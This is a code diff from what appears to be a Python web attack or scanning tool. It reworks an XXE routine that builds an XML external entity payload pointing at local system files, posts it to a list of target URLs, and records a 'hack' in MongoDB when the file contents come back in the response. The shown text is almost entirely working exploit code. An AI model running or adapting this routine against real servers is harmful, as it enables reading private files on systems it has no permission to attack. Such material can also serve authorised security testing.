@@ -63,7 +63,7 @@ def insertItem(item : schema , mongo):
 # return value : None
 
 # XXE Point
-def XXEPOINT(target_urls : list , mongo , attacker_server):
+def xxe(target_urls : list , mongo , attacker_server):
     genXxeAttack(target_urls , mongo)
 
     sendMsg(client_socket, "reset".encode())
@@ -88,33 +88,19 @@ def genXxeAttack(target_urls : list , mongo):
             'Accept': 'application/xml' }
 
     for target_url in target_urls:
-        name_list = getNameList(target_url)
-
         for xxe_keyword, target_file in target_files.items():
 
             new_schema = schema("LFI")
             new_schema.setUrl(target_url)
             payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}"> ]><foo>&xxe;</foo>'''.format(target_file)
+        
+            response = session.post(target_url, data = payload , headers = headers)
+            response_data = response.text
+            if response_data.find(xxe_keyword) != -1:
+                new_schema.setisHack()
+                new_schema.setContent(response_data)
             
-            for tag_name in name_list:
-                
-                data = {
-                    tag_name : payload
-                }
-
-                response = session.post(target_url, data = data , headers = headers)
-
-                response_data = response.text
-
-                print(payload)
-
-
-                if response_data.find(xxe_keyword) != -1:
-                    
-                    new_schema.setisHack()
-                    new_schema.setContent(response_data)
-                
-                insertItem(new_schema, mongo)
+            insertItem(new_schema, mongo)
 
 
 def getNameList(url : str) -> list :
